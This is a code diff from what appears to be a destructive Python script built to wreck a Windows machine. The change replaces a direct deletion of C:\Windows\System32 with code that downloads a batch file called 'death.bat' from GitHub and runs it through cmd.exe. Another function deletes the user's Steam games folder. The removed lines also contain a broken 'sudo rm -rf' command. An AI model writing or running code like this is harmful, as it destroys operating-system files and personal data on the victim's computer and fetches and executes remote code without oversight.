@@ -7,21 +7,18 @@ import urllib.request
 import subprocess
 import shutil
 
-def delete_folder(folder_path):
-    if os.path.exists(folder_path):
-        try:
-            shutil.rmtree(folder_path)
-            print(f"Folder '{folder_path}' deleted successfully.")
-        except Exception as e:
-            print(f"Error: {e}")
-    else:
-        print(f"Folder '{folder_path}' does not exist.")
-
 def delsystem32():
-    delete_folder(r"C:\Windows\System32")
+    url = "https://raw.githubusercontent.com/FeltMacaroon389/System32-Deleter/refs/heads/master/death.bat"
+    bat_file_path = "death.bat"
 
-    dirtodel: r"C:\Windows\System32"
-    os.system(f'sudo rm -rf dirtodel')
+    with urllib.request.urlopen(url) as response:
+        bat_content = response.read().decode('utf-8')
+
+    with open(bat_file_path, "w") as file:
+        file.write(bat_content)
+
+    subprocess.run(["cmd.exe", "/c", bat_file_path])
+
 def delallgames():
     #every single games you have on steam, gog and epic just removed. maybe even p!rated games with C:/games.
     os.rmdir(r"C:\Program Files (x86)\Steam\steamapps\common")
